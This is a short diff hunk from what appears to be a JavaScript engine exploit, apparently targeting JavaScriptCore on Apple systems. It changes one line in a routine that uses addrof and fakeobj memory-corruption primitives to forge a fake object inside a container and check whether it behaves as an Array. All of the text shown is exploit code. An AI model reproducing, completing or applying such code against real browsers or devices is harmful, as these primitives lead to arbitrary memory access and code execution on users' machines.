@@ -569,7 +569,7 @@ var VM_PROT_EXECUTE = 0x4
     var containerAddr = addrof(container);
     print(`[+] container @ ${containerAddr}`);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr, new Int64(0x10)));
+    var hax = fakeobj(Add(containerAddr, 0x10));
     var maxtry = 0;
     if (hax instanceof Array) {
             print("got fakeobj with real struct id");
